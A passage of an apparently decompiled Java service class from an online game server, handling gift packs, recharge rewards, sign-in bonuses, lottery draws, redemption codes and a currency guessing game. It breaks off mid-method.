package com.kitty.system.game.welfare.service;

import com.kitty.cache.RedisService;
import com.kitty.common.bean.Lottery;
import com.kitty.common.db.BaseEntity;
import com.kitty.common.db.DbRecordService;
import com.kitty.common.start.ServerService;
import com.kitty.common.thread.IdWorker;
import com.kitty.common.utils.JsonUtils;
import com.kitty.common.utils.LotteryUtils;
import com.kitty.common.utils.NumberUtil;
import com.kitty.common.utils.RandomUtil;
import com.kitty.common.utils.TimeUtil;
import com.kitty.common.utils.convert.MoneyUtil;
import com.kitty.common.utils.spring.SpringUtils;
import com.kitty.common.utils.uuid.IdUtils;
import com.kitty.listener.EventType;
import com.kitty.listener.annotation.EventHandler;
import com.kitty.listener.event.CreationRoleEvent;
import com.kitty.mina.ServerConfig;
import com.kitty.mina.cache.DataCache;
import com.kitty.mina.cache.Deploy;
import com.kitty.mina.cache.SessionUtils;
import com.kitty.mina.message.Message;
import com.kitty.mina.message.MessagePusher;
import com.kitty.record.RecordThread;
import com.kitty.system.common.data.DataGlobalFunc;
import com.kitty.system.common.message.RespHint;
import com.kitty.system.common.message.RespMsg;
import com.kitty.system.common.message.RespNotifyMiscEx;
import com.kitty.system.common.utils.NutConcurrentMap;
import com.kitty.system.game.bag.service.BagService;
import com.kitty.system.game.general.message.ReqGeneralNotify;
import com.kitty.system.game.role.domain.Role;
import com.kitty.system.game.role.service.RoleService;
import com.kitty.system.game.task.service.TaskService;
import com.kitty.system.game.vo.ItemEasyInfo;
import com.kitty.system.game.vo.Npc;
import com.kitty.system.game.vo.init.Item;
import com.kitty.system.game.vo.utils.Const;
import com.kitty.system.game.welfare.domain.FiveGuess;
import com.kitty.system.game.welfare.domain.GiftBag;
import com.kitty.system.game.welfare.domain.GiftBagRecord;
import com.kitty.system.game.welfare.domain.GiftsInfo;
import com.kitty.system.game.welfare.message.ReqFiveGuess;
import com.kitty.system.game.welfare.message.ReqFiveGuessReply;
import com.kitty.system.game.welfare.message.ReqLuckDraw;
import com.kitty.system.game.welfare.message.ReqMagicBoxInfo;
import com.kitty.system.game.welfare.message.ReqMagicBoxLotto;
import com.kitty.system.game.welfare.message.RespFiveGuess;
import com.kitty.system.game.welfare.message.RespGiftState;
import com.kitty.system.game.welfare.message.RespLuckDrawInfo;
import com.kitty.system.game.welfare.message.RespMagicBoxInfo;
import com.kitty.system.game.welfare.message.RespNewBieGift;
import com.kitty.system.game.welfare.message.RespNewDistrictSign;
import com.kitty.system.game.welfare.message.RespPayBieGift;
import com.kitty.system.game.welfare.message.RespPayUrl;
import com.kitty.system.game.welfare.message.RespPrizeDraw;
import com.kitty.system.game.welfare.message.vo.LuckDrawInfo;
import com.kitty.system.game.welfare.message.vo.MagicBox;
import com.kitty.system.game.welfare.pool.WelfareDataPool;
import com.kitty.system.init.domain.SysCharge;
import com.kitty.system.init.domain.SysDataChargeAward;
import com.kitty.system.init.domain.SysDataGradeAward;
import com.kitty.system.init.domain.SysDataLuckDraw;
import com.kitty.system.init.domain.SysDataMagicBox;
import com.kitty.system.init.domain.SysDataNewDistrictSign;
import com.kitty.system.init.domain.SysDataPrizeDraw;
import com.kitty.system.init.domain.vo.Param;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.math.BigDecimal;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;
import org.apache.mina.core.session.IoSession;
import org.nutz.dao.Cnd;
import org.nutz.dao.Condition;
import org.nutz.dao.Dao;
import org.nutz.http.Request;
import org.nutz.http.Response;
import org.nutz.http.Sender;
import org.nutz.lang.Strings;
import org.nutz.lang.util.NutMap;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class WelfareService {
  @Autowired
  private Dao dao;
  
  @Autowired
  private IdWorker worker;
  
  @Autowired
  private ServerConfig serverConfig;
  
  @Autowired
  private BagService bagService;
  
  @Autowired
  private RoleService roleService;
  
  @Autowired
  private TaskService taskService;
  
  @Autowired
  private RedisService redisService;
  
  public void openNewBitGift(Role role) {
    Map<Integer, SysDataGradeAward> gradeAwardMap = WelfareDataPool.gradeAwardMap;
    List<GiftsInfo> objects = new ArrayList<>();
    String newcomer = role.getExtendBox().getNewcomer();
    if (newcomer == null)
      newcomer = ""; 
    String[] split = newcomer.split("-");
    List<String> strings = Arrays.asList(split);
    Iterator<Integer> var7 = gradeAwardMap.keySet().iterator();
    while (var7.hasNext()) {
      Integer grade = var7.next();
      if (strings.contains(String.valueOf(grade))) {
        objects.add(new GiftsInfo(grade.shortValue(), (byte)2));
        continue;
      } 
      objects.add(new GiftsInfo(grade.shortValue(), (byte)1));
    } 
    RespNewBieGift respNewBieGift = new RespNewBieGift();
    respNewBieGift.setGifts(objects);
    MessagePusher.pushMessage(role, (Message)respNewBieGift);
  }
  
  public void fetchNewBieGift(Role role, int grade) {
    boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
    if (clicker) {
      String msg = DataGlobalFunc.needGradeJudge(grade / 1000, grade % 1000, role.getRelive().intValue(), role.getLevel().intValue(), "你的#<R>角色等级#不足");
      if (msg != null) {
        MessagePusher.pushMessage(role, (Message)new RespMsg(msg));
      } else {
        Map<Integer, SysDataGradeAward> gradeAwardMap = WelfareDataPool.gradeAwardMap;
        String newcomer = role.getExtendBox().getNewcomer();
        if (newcomer == null)
          newcomer = ""; 
        String[] split = newcomer.split("-");
        List<String> strings = Arrays.asList(split);
        if (strings.contains(String.valueOf(grade))) {
          MessagePusher.pushMessage(role, (Message)new RespMsg("你已经领取过该阶段奖励"));
        } else {
          SysDataGradeAward award = gradeAwardMap.get(Integer.valueOf(grade));
          if (award != null) {
            boolean pos = this.bagService.checkPos(role, award.getAward());
            if (!pos)
              return; 
            role.getExtendBox().setNewcomer(newcomer + "-" + grade);
            MessagePusher.pushMessage(role, (Message)new RespHint(18, (short)1));
            this.bagService.sendReward(role, award.getAward(), "等级奖励", 0);
          } 
        } 
      } 
    } 
  }
  
  public void openRechargeGift(Role role) {
    Map<Integer, SysDataChargeAward> chargeMap = WelfareDataPool.chargeAwardMap;
    long total_gold = role.getTotalGold();
    ArrayList<Integer> totalContent = role.getExtendBox().getTotalContent();
    MessagePusher.pushMessage(role, (Message)new RespPayBieGift(giftsInfo(chargeMap, totalContent), String.valueOf(total_gold), (byte)0));
  }
  
  public void fetchRechargeGift(Role role, int serial) {
    boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
    if (clicker) {
      Map<Integer, SysDataChargeAward> chargeMap = WelfareDataPool.chargeAwardMap;
      SysDataChargeAward charge = chargeMap.get(Integer.valueOf(serial));
      if (charge == null) {
        MessagePusher.pushMessage(role, (Message)new RespMsg("您领取的奖励不存在"));
      } else {
        ArrayList<Integer> totalContent = role.getExtendBox().getTotalContent();
        if (totalContent.contains(Integer.valueOf(serial))) {
          MessagePusher.pushMessage(role, (Message)new RespMsg("您已领取该阶段奖励"));
        } else {
          long total_gold = role.getTotalGold();
          if (total_gold < Long.valueOf(charge.getAmount()).longValue()) {
            MessagePusher.pushMessage(role, (Message)new RespMsg("您没有资格领取"));
          } else {
            boolean pos = this.bagService.checkPos(role, charge.getAward());
            if (pos) {
              MessagePusher.pushMessage(role, (Message)new RespHint(19, (short)1));
              totalContent.add(Integer.valueOf(charge.getSerial()));
              this.bagService.sendReward(role, charge.getAward(), "某阶段充值", 0);
              role.save();
            } 
          } 
        } 
      } 
    } 
  }
  
  public void openFirstRechargeGift(Role role) {
    RespGiftState respGiftState = new RespGiftState();
    if (role.getExtendBox().getSc() == 1) {
      respGiftState.setState((byte)2);
    } else {
      long total_gold = role.getTotalGold();
      if (total_gold > 0L)
        respGiftState.setIs((byte)2); 
    } 
    MessagePusher.pushMessage(role, (Message)respGiftState);
  }
  
  public void fetchFirstRechargeGift(Role role) {
    boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
    if (clicker) {
      long total_gold = role.getTotalGold();
      if (total_gold <= 0L) {
        MessagePusher.pushMessage(role, (Message)new RespMsg("请先任意充值一笔，再来领取吧"));
      } else if (role.getExtendBox().getSc() == 1) {
        MessagePusher.pushMessage(role, (Message)new RespMsg("您已领取过奖励"));
      } else {
        boolean pos = this.bagService.checkPos(role, WelfareDataPool.firstRechargeGift);
        if (pos) {
          MessagePusher.pushMessage(role, (Message)new RespHint(20, (short)1));
          role.getExtendBox().setSc((byte)1);
          this.bagService.sendReward(role, WelfareDataPool.firstRechargeGift, "首冲礼包", 0);
          role.save();
          RecordThread.getInstance().add2Queue(role.getId().longValue(), role.getRoleId().intValue(), (short)1000, (byte)1, "领取首冲礼包", role.getMarking());
        } 
      } 
    } 
  }
  
  public void openNewDistrictSign(Role role, int day) {
    if (day <= 0) {
      Date date = new Date(role.getCreateTime());
      day = TimeUtil.differentDays(date, new Date());
      day++;
    } 
    NutMap map = role.getExtendBox().getNewDistrict();
    MessagePusher.pushMessage(role, (Message)new RespNewDistrictSign(JsonUtils.object2String(map), day));
  }
  
  public void fetchNewDistrictSign(Role role) {
    boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
    if (clicker) {
      Date date = new Date(role.getCreateTime());
      int day = TimeUtil.differentDays(date, new Date());
      day++;
      if (day <= WelfareDataPool.newDistrictMap.size()) {
        String key = String.valueOf(day);
        NutMap newDistrict = role.getExtendBox().getNewDistrict();
        int anInt = newDistrict.getInt(key);
        if (anInt > 0) {
          MessagePusher.pushMessage(role, (Message)new RespMsg("你已经领取过该阶段奖励"));
        } else {
          SysDataNewDistrictSign sign = (SysDataNewDistrictSign)WelfareDataPool.newDistrictMap.get(Byte.valueOf((byte)day));
          if (sign != null) {
            boolean pos = this.bagService.checkPos(role, sign.getList());
            if (pos) {
              newDistrict.setv(key, Integer.valueOf(1));
              openNewDistrictSign(role, day);
              this.bagService.sendReward(role, sign.getList(), "新区七天签到", 0);
              role.save();
              RecordThread.getInstance().add2Queue(role.getId().longValue(), role.getRoleId().intValue(), (short)1000, (byte)1, String.format("领取七天签到，天数为：%d", new Object[] { Integer.valueOf(day) }), role.getMarking());
            } 
          } 
        } 
      } 
    } 
  }
  
  public void openDayRechargeGift(Role role) {
    String when = TimeUtil.when();
    Map<Integer, SysDataChargeAward> chargeMap = WelfareDataPool.dayChargeAwardMap;
    long total_gold = role.getTaskProgress().getEveryDayRecharge().getLong(when + "_gold", 0L);
    String string = role.getTaskProgress().getEveryDayRecharge().getString(when + "_award", "");
    List<Integer> list = new ArrayList<>();
    if (!string.isEmpty()) {
      String[] var9 = string.split(",");
      int var10 = var9.length;
      for (int var11 = 0; var11 < var10; var11++) {
        String s = var9[var11];
        list.add(Integer.valueOf(s));
      } 
    } 
    MessagePusher.pushMessage(role, (Message)new RespPayBieGift(giftsInfo(chargeMap, list), String.valueOf(total_gold), (byte)1));
  }
  
  public void fetchDayRechargeGift(Role role, int serial) {
    Map<Integer, SysDataChargeAward> chargeMap = WelfareDataPool.dayChargeAwardMap;
    SysDataChargeAward charge = chargeMap.get(Integer.valueOf(serial));
    if (charge == null) {
      MessagePusher.pushMessage(role, (Message)new RespMsg("您领取的奖励不存在"));
    } else {
      String when = TimeUtil.when();
      NutConcurrentMap recharge = role.getTaskProgress().getEveryDayRecharge();
      String string = recharge.getString(when + "_award", "");
      List<Integer> list = new ArrayList<>();
      if (!string.isEmpty()) {
        String[] var10 = string.split(",");
        int var11 = var10.length;
        for (int var12 = 0; var12 < var11; var12++) {
          String s = var10[var12];
          list.add(Integer.valueOf(s));
        } 
      } 
      if (list.contains(Integer.valueOf(serial))) {
        MessagePusher.pushMessage(role, (Message)new RespMsg("您已领取该阶段奖励"));
      } else {
        long total_gold = role.getTaskProgress().getEveryDayRecharge().getLong(when + "_gold", 0L);
        if (total_gold < Long.valueOf(charge.getAmount()).longValue()) {
          MessagePusher.pushMessage(role, (Message)new RespMsg("您没有资格领取"));
        } else {
          boolean pos = this.bagService.checkPos(role, charge.getAward());
          if (pos) {
            MessagePusher.pushMessage(role, (Message)new RespHint(19, (short)1));
            recharge.setv(when + "_award", string + serial + ",");
            this.bagService.sendReward(role, charge.getAward(), "每日充值", 0);
            role.save();
            RecordThread.getInstance().add2Queue(role.getId().longValue(), role.getRoleId().intValue(), (short)1000, (byte)1, String.format("领取某阶段每日充值礼包，礼包编号：%d", new Object[] { Integer.valueOf(serial) }), role.getMarking());
          } 
        } 
      } 
    } 
  }
  
  public List<GiftsInfo> giftsInfo(Map<Integer, SysDataChargeAward> chargeMap, List<Integer> list) {
    List<GiftsInfo> objects = new ArrayList<>();
    Iterator<Integer> var4 = chargeMap.keySet().iterator();
    while (var4.hasNext()) {
      Integer key = var4.next();
      SysDataChargeAward charge = chargeMap.get(key);
      if (list.contains(key)) {
        objects.add(new GiftsInfo((short)charge.getSerial(), (byte)2));
        continue;
      } 
      objects.add(new GiftsInfo((short)charge.getSerial(), (byte)1));
    } 
    return objects;
  }
  
  public void openPrizeDraw(Role role) {
    int count = role.getExtendBox().getParams().getInt("prize_draw", 0);
    RespPrizeDraw respPrizeDraw = new RespPrizeDraw();
    respPrizeDraw.setCount((short)count);
    MessagePusher.pushMessage(role, (Message)respPrizeDraw);
  }

  public void luckDraw(IoSession session, ReqLuckDraw reqLuckDraw) {
    Role role = SessionUtils.getRoleBySession(session);
    if (role != null) {
      boolean clicker = this.roleService.mouserClicker(role, "luck", 250L);
      if (clicker) {
        int num = 10;
        long deductScore = WelfareDataPool.TEN_LUCK_DRAW;
        if (reqLuckDraw.getType() == 1) {
          num = 1;
          deductScore = WelfareDataPool.ONCE_LUCK_DRAW;
        }

        if (role.getExtendBox().getChargeScore() < deductScore) {
          MessagePusher.pushMessage((Role)role, new RespMsg("积分不足"));
        } else if (this.bagService.residueBagPos(role, false) < num) {
          MessagePusher.pushMessage((Role)role, new RespMsg("物品栏空间不足"));
        } else {
          RoleService roleService = SpringUtils.getRoleService();
          boolean b = roleService.deductCurrency(role, Const.RES_TYPE_CHARGE_SCORE, deductScore, "请求抽奖");
          if (b) {
            List<SysDataLuckDraw> randoms = WelfareDataPool.luckDraw;
            List list = new ArrayList();
            randoms.forEach((itemOpen) -> {
              list.add(new Lottery(itemOpen.getId(), "", itemOpen.getRate()));
            });
            List orignalRates = new ArrayList(list.size());
            Iterator iterator = list.iterator();

            while(iterator.hasNext()) {
              Lottery lottery = (Lottery)iterator.next();
              orignalRates.add(lottery.getBili());
            }

            List objects = new ArrayList(num);
            List drawInfo = new ArrayList(num);

            int serial;
            SysDataLuckDraw object;
            for(int i = 0; i < num; ++i) {
              serial = LotteryUtils.lottery(orignalRates);
              Lottery lottery2 = (Lottery)list.get(serial);
              object = randoms.stream().filter((e) -> {
                return lottery2.getSerial().equals(e.getId());
              }).findFirst().orElse(null);
              if (object != null) {
                objects.add(object);
                drawInfo.add(new LuckDrawInfo(object.getSerial(), object.getNum()));
              } else {
                System.out.println("幸运抽抽数据为空 = " + object);
              }
            }

            RespLuckDrawInfo respLuckDrawInfo = new RespLuckDrawInfo();
            respLuckDrawInfo.setList(drawInfo);
            respLuckDrawInfo.setClassify(reqLuckDraw.getClassify());
            MessagePusher.pushMessage((Role)role, respLuckDrawInfo);
            serial = 0;
            int addNum = 0;

            for(Iterator var24 = objects.iterator(); var24.hasNext(); this.bagService.send(role, object.getSerial(), object.getType(), object.getNum(), -1, "幸运抽抽", 0)) {
              object = (SysDataLuckDraw)var24.next();
              if (object.getIsNotice() >= 1) {
                addNum = object.getNum();
                serial = object.getSerial();
              }
            }

            role.save();
            if (serial > 0) {
              ItemEasyInfo easyInfo = DataGlobalFunc.getItemEasyInfo(serial);
              if (easyInfo == null) {
                return;
              }

              String tips = "";
              if (addNum > 1) {
                tips = "#<r:239,g:105,b:33>X" + addNum + "#";
              }

              MessagePusher.notify2Lb(role, 205, role.getName(), serial, easyInfo.getName(), tips);
            }
          }
        }
      }
    }

  }
  
  public void luckDraw2(IoSession session, ReqLuckDraw reqLuckDraw) {
    Role role = SessionUtils.getRoleBySession(session);
    if (role != null) {
      boolean clicker = this.roleService.mouserClicker(role, "luck", 250L);
      if (clicker) {
        int num = 10;
        long deductScore = WelfareDataPool.TEN_LUCK_DRAW;
        if (reqLuckDraw.getType() == 1) {
          num = 1;
          deductScore = WelfareDataPool.ONCE_LUCK_DRAW;
        } 
        if (role.getExtendBox().getChargeScore() < deductScore) {
          MessagePusher.pushMessage(role, (Message)new RespMsg("积分不足"));
        } else if (this.bagService.residueBagPos(role, false) < num) {
          MessagePusher.pushMessage(role, (Message)new RespMsg("物品栏空间不足"));
        } else {
          RoleService roleService = SpringUtils.getRoleService();
          boolean b = roleService.deductCurrency(role, Const.RES_TYPE_CHARGE_SCORE, deductScore, "请求抽奖");
          if (b) {
            List<SysDataLuckDraw> randoms = WelfareDataPool.luckDraw;
            List<Lottery> list = new ArrayList<>();
            randoms.forEach(itemOpen -> list.add(new Lottery(itemOpen.getId(), "", itemOpen.getRate())));
            List<Double> orignalRates = new ArrayList<>(list.size());
            Iterator<Lottery> iterator = list.iterator();
            while (iterator.hasNext()) {
              Lottery lottery = iterator.next();
              orignalRates.add(lottery.getBili());
            } 
            List<SysDataLuckDraw> objects = new ArrayList<>(num);
            List<LuckDrawInfo> drawInfo = new ArrayList<>(num);
            SysDataLuckDraw luckDraw;
            for (int i = 0; i < num; i++) {
              int j = LotteryUtils.lottery(orignalRates);
              Lottery lottery2 = list.get(j);
              luckDraw = randoms.stream().filter(e -> lottery2.getSerial().equals(e.getId())).findFirst().orElse(null);
              if (luckDraw != null) {
                objects.add(luckDraw);
                drawInfo.add(new LuckDrawInfo(luckDraw.getSerial(), luckDraw.getNum()));
              } else {
                System.out.println("幸运抽抽数据为空 = " + luckDraw);
              } 
            } 
            RespLuckDrawInfo respLuckDrawInfo = new RespLuckDrawInfo();
            respLuckDrawInfo.setList(drawInfo);
            respLuckDrawInfo.setClassify(reqLuckDraw.getClassify());
            MessagePusher.pushMessage(role, (Message)respLuckDrawInfo);
            int serial = 0;
            int addNum = 0;

            for (Iterator<SysDataLuckDraw> var24 = objects.iterator(); var24.hasNext(); this.bagService.send(role, luckDraw.getSerial(), luckDraw.getType(), luckDraw.getNum(), -1, "幸运抽抽", 0)) {
              luckDraw = var24.next();
              if (luckDraw.getIsNotice() >= 1) {
                addNum = luckDraw.getNum();
                serial = luckDraw.getSerial();
              } 
            } 
            role.save();
            if (serial > 0) {
              ItemEasyInfo easyInfo = DataGlobalFunc.getItemEasyInfo(serial);
              if (easyInfo == null)
                return; 
              String tips = "";
              if (addNum > 1)
                tips = "#<r:239,g:105,b:33>X" + addNum + "#"; 
              MessagePusher.notify2Lb(role, 205, new Object[] { role.getName(), serial, easyInfo.getName(), tips });
            } 
          } 
        } 
      } 
    } 
  }
  
  public void prizeDraw(IoSession session, ReqLuckDraw reqLuckDraw) {
    Role role = SessionUtils.getRoleBySession(session);
    if (role != null) {
      boolean clicker = this.roleService.mouserClicker(role, "luck", 250L);
      if (clicker) {
        int count = role.getExtendBox().getParams().getInt("prize_draw", 0);
        int num = 5;
        long deductGold = WelfareDataPool.FIVE_PRIZE_DRAW;
        if (reqLuckDraw.getType() == 1) {
          num = 1;
          deductGold = WelfareDataPool.ONCE_PRIZE_DRAW;
        } 
        if (this.roleService.checkCurrency(role, Const.RESTYPE_GOLD, deductGold))
          if (this.bagService.residueBagPos(role, false) < num) {
            MessagePusher.pushMessage(role, (Message)new RespMsg("物品栏空间不足"));
          } else {
            RoleService roleService = SpringUtils.getRoleService();
            boolean b = roleService.deductCurrency(role, Const.RESTYPE_GOLD, deductGold, "镜鉴绮罗");
            if (b) {
              List<SysDataPrizeDraw> randoms = WelfareDataPool.prizeDrawMap;
              List<Lottery> list = new ArrayList<>();
              randoms.forEach(itemOpen -> list.add(new Lottery(itemOpen.getId(), "", Double.valueOf(itemOpen.getRate()))));
              List<Double> rates = new ArrayList<>(list.size());
              Iterator<Lottery> iterator = list.iterator();
              Lottery lottery = null;
              while (iterator.hasNext()) {
                lottery = iterator.next();
                rates.add(lottery.getBili());
              } 
              List<SysDataPrizeDraw> objects = new ArrayList<>(num);
              List<LuckDrawInfo> drawInfo = new ArrayList<>(num);
              for (int i = 0; i < num; i++) {
                count++;
                if (count >= WelfareDataPool.prizeDrawTop) {
                  objects.add(new SysDataPrizeDraw(-1, 1, 1));
                  drawInfo.add(new LuckDrawInfo(-1, 1));
                  count = 0;
                } else {
                  int index = LotteryUtils.lottery(rates);
                  Lottery lottery2 = list.get(index);
                  SysDataPrizeDraw luckDraw = randoms.stream().filter(e -> lottery2.getSerial().equals(Integer.valueOf(e.getId()))).findFirst().orElse((SysDataPrizeDraw)null);
                  if (luckDraw != null) {
                    objects.add(luckDraw);
                    drawInfo.add(new LuckDrawInfo(luckDraw.getSerial(), luckDraw.getNum()));
                  } else {
                    System.out.println("累计数据为空 = " + luckDraw);
                  } 
                } 
              } 
              RespLuckDrawInfo respLuckDrawInfo = new RespLuckDrawInfo();
              respLuckDrawInfo.setList(drawInfo);
              respLuckDrawInfo.setClassify(reqLuckDraw.getClassify());
              MessagePusher.pushMessage(role, (Message)respLuckDrawInfo);
              Iterator<SysDataPrizeDraw> var23 = objects.iterator();
              while (var23.hasNext()) {
                SysDataPrizeDraw object = var23.next();
                this.bagService.send(role, object.getSerial(), object.getType(), object.getNum(), -1, "镜鉴绮罗", 0);
              } 
              role.getExtendBox().getParams().setv("prize_draw", Integer.valueOf(count));
              openPrizeDraw(role);
              role.save();
            } 
          }  
      } 
    } 
  }
  
  public void fetchGiftBag(Role role, String string) {
    boolean clicker = this.roleService.mouserClicker(role, "gift", 250L);
    if (clicker) {
      long millis = System.currentTimeMillis();
      GiftBag giftBag = (GiftBag)WelfareDataPool.giftBagMap.get(string);
      if (giftBag == null) {
        MessagePusher.pushMessage(role, (Message)new RespMsg("激活失败，此码错误!"));
      } else if (giftBag.getTime() > 0L && millis > giftBag.getTime()) {
        MessagePusher.pushMessage(role, (Message)new RespMsg("激活失败，此码已过期!"));
      } else {
        List<String> giftBagRecordList = getGiftBagRecord(role);
        if (giftBagRecordList.contains(string)) {
          MessagePusher.pushMessage(role, (Message)new RespMsg("激活失败，此码错误或已过期#<E:17>#"));
        } else {
          boolean pos = this.bagService.checkPos(role, giftBag.getRewards());
          if (pos) {
            giftBagRecordList.add(string);
            GiftBagRecord record = new GiftBagRecord(role.getId().longValue(), string);
            DbRecordService.getInstance().add2Queue((BaseEntity)record);
            String cause = String.format("领取兑换码：%s", new Object[] { string });
            this.bagService.sendReward(role, giftBag.getRewards(), cause, 0);
            RecordThread.getInstance().add2Queue(role.getId().longValue(), role.getRoleId().intValue(), (short)1000, (byte)1, cause, role.getMarking());
          } 
        } 
      } 
    } 
  }
  
  public void recharge(Role role, ReqGeneralNotify notify) {
    if (((ServerService)SpringUtils.getBean(ServerService.class)).getRecharge() > 0)
      try {
        SysCharge sysCharge = (SysCharge)WelfareDataPool.chargeMap.get(Integer.valueOf(notify.getStatus()));
        if (sysCharge == null)
          MessagePusher.pushMessage(role, (Message)new RespMsg("充值异常-请正确充值")); 
        ServerService service = (ServerService)SpringUtils.getBean(ServerService.class);
        Map<String, Object> params = new HashMap<>(7);
        params.put("id", role.getSid());
        params.put("roleId", role.getRoleId());
        params.put("serial", notify.getStatus());
        params.put("type", notify.getString());
        params.put("totalAmount", String.valueOf(sysCharge.getAmount()));
        params.put("simulate", "1");
        params.put("server", role.getMarking());
        Request request = Request.create(service.getUrl(), Request.METHOD.POST).setParams(params);
        Response response = Sender.create(request).setTimeout(30000).send();
        if (response.isOK()) {
          if (!Strings.isEmpty(response.getContent())) {
            String content = response.getContent();
            int length = content.length();
            String front = content.substring(0, length / 2);
            String back = content.substring(length / 2);
            MessagePusher.pushMessage(role, (Message)new RespPayUrl(front, back));
          } else {
            MessagePusher.pushMessage(role, (Message)new RespMsg("充值异常"));
          } 
        } else {
          MessagePusher.pushMessage(role, (Message)new RespMsg("充值异常-未找到地址"));
        } 
      } catch (Exception var12) {
        MessagePusher.pushMessage(role, (Message)new RespMsg("充值未开启"));
      }  
  }
  
  public List<String> getGiftBagRecord(Role role) {
    List<String> strings = (List<String>)DataCache.GIFT_RECORD.get(role.getId());
    if (strings != null)
      return strings; 
    strings = new ArrayList<>();
    List<GiftBagRecord> list = this.dao.query(GiftBagRecord.class, (Condition)Cnd.where("r_id", "=", role.getId()));
    Iterator<GiftBagRecord> var4 = list.iterator();
    while (var4.hasNext()) {
      GiftBagRecord record = var4.next();
      strings.add(record.getName());
    } 
    DataCache.GIFT_RECORD.put(role.getId(), strings);
    return strings;
  }
  
  public void fiveGuess(IoSession session, ReqFiveGuess reqFiveGuess) {
    Role role = SessionUtils.getRoleBySession(session);
    if (role != null)
      if (reqFiveGuess.getAmount() <= 0) {
        MessagePusher.pushMessage(role.getId().longValue(), (Message)new RespMsg("请先竞猜金额。"));
      } else {
        long limitAmount = 30000000L;
        if (reqFiveGuess.getAmount() > limitAmount) {
          MessagePusher.pushMessage(role.getId().longValue(), (Message)new RespMsg(String.format("竞猜金额上限：#<R>%s#", new Object[] { MoneyUtil.partition(new BigDecimal(limitAmount)) })));
        } else if (guessLimit(role)) {
          FiveGuess guessInfo = getFiveGuessInfo(role);
          if (guessInfo.getToken() != null) {
            MessagePusher.pushMessage(role.getId().longValue(), (Message)new RespMsg("转盘转动中，请稍后再试。"));
          } else if (guessInfo.getCount() <= 0) {
            MessagePusher.pushMessage(role.getId().longValue(), (Message)new RespMsg("你今天的机会已经用完了，还是明天再来吧!"));
          } else {
            boolean currency = this.roleService.deductCurrency(role, Const.RESTYPE_SILVER, reqFiveGuess.getAmount(), "五行竞猜");
            if (currency) {
              String outer, inner, prizeOuter, prizeInner;
              short count2, type = reqFiveGuess.getChoice();
              String str = type + "";
              if (str.length() == 2) {
                outer = str.substring(0, 1);
                inner = str.substring(1, str.length());
              } else {
                if (str.length() != 3)
                  return; 
                outer = str.substring(0, 2);
                inner = str.substring(2, str.length());
              } 
              if (RandomUtil.round(Integer.valueOf(1), Integer.valueOf(WelfareDataPool.FIVE_GUESS_OUTER_PROB)) == 1) {
                prizeOuter = outer;
              } else {
                int r;
                do {
                  r = RandomUtil.round(Integer.valueOf(1), Integer.valueOf(12));
                } while (r == Integer.parseInt(outer));
                prizeOuter = r + "";
              } 
              if (RandomUtil.round(Integer.valueOf(1), Integer.valueOf(WelfareDataPool.FIVE_GUESS_INNER_PROB)) == 1) {
                prizeInner = inner;
              } else {
                int r;
                do {
                  r = RandomUtil.round(Integer.valueOf(1), Integer.valueOf(5));
                } while (r == Integer.parseInt(inner));
                prizeInner = r + "";
              } 
              short count = (short)(guessInfo.getCount() - 1);
              if (count < 0) {
                count2 = 0;
              } else {
                count2 = count;
              } 
              guessInfo.setCount(count2);
              guessInfo.setToken(IdUtils.fastSimpleUUID());
              guessInfo.setAmount(reqFiveGuess.getAmount());
              guessInfo.setChoice(reqFiveGuess.getChoice());
              guessInfo.setPrize(Short.valueOf(prizeOuter + prizeInner).shortValue());
              guessInfo.save();
              RespFiveGuess respFiveGuess = new RespFiveGuess((byte)1, String.valueOf(guessInfo.getMoney()), "0", reqFiveGuess.getAmount(), type, guessInfo.getPrize(), guessInfo.getToken(), guessInfo.getCount());
              MessagePusher.pushMessage(session, (Message)respFiveGuess);
            } 
          } 
        } 
      }  
  }
  
  public void fiveGuessReply(IoSession session, ReqFiveGuessReply reqFiveGuessReply) {
    Role role = SessionUtils.getRoleBySession(session);
    if (role != null) {
      FiveGuess guessInfo = getFiveGuessInfo(role);
      if (guessInfo.getToken().equals(reqFiveGuessReply.getToken())) {
        String msg = "";
        long multi = 1L;
        if (guessInfo.getChoice() == guessInfo.getPrize()) {
          multi = 60L;
          String[] choice = DataGlobalFunc.getGuess(guessInfo.getPrize() + "");
          String outerName = WelfareDataPool.FIVE_GUESS_OUTER_NAME[Integer.parseInt(choice[0]) - 1];
          String outerName2 = WelfareDataPool.FIVE_GUESS_INNER_NAME[Integer.parseInt(choice[1]) - 1];
          msg = MessageFormat.format("真是好运气啊！#<BB>{0}#在五行竞猜活动中猜中了五行#<EP>{1}#神兽#<EP>{2}#，获得了#<IR{3}>#{4}#<EP>银两#的奖励！", new Object[] { role.getName(), outerName2, outerName, Const.RESTYPE_SILVER, MoneyUtil.colours(Long.valueOf(multi * guessInfo.getAmount())) });
        } else {
          String[] choice = DataGlobalFunc.getGuess(guessInfo.getChoice() + "");
          String[] prize2 = DataGlobalFunc.getGuess(guessInfo.getPrize() + "");
          if (choice == null || prize2 == null) {
            guessInfo.clear();
            guessInfo.save();
            return;
          } 
          if (choice[1].equals(prize2[1])) {
            multi *= 5L;
            String outerName2 = WelfareDataPool.FIVE_GUESS_INNER_NAME[Integer.parseInt(prize2[1]) - 1];
            msg = MessageFormat.format("真是好运气啊！#<BB>{0}#在五行竞猜活动中猜中了五行#<EP>{1}#，获得了#<IR{2}>#{3}#<EP>银两#的奖励！", new Object[] { role.getName(), outerName2, Const.RESTYPE_SILVER, MoneyUtil.colours(Long.valueOf(multi * guessInfo.getAmount())) });
          } else if (choice[0].equals(prize2[0])) {
            multi *= 12L;
            String outerName2 = WelfareDataPool.FIVE_GUESS_OUTER_NAME[Integer.parseInt(prize2[0]) - 1];
            msg = MessageFormat.format("真是好运气啊！#<BB>{0}#在五行竞猜活动中猜中了神兽#<EP>{1}#，获得了#<IR{2}>#{3}#<EP>银两#的奖励！", new Object[] { role.getName(), outerName2, Const.RESTYPE_SILVER, MoneyUtil.colours(Long.valueOf(multi * guessInfo.getAmount())) });
          } 
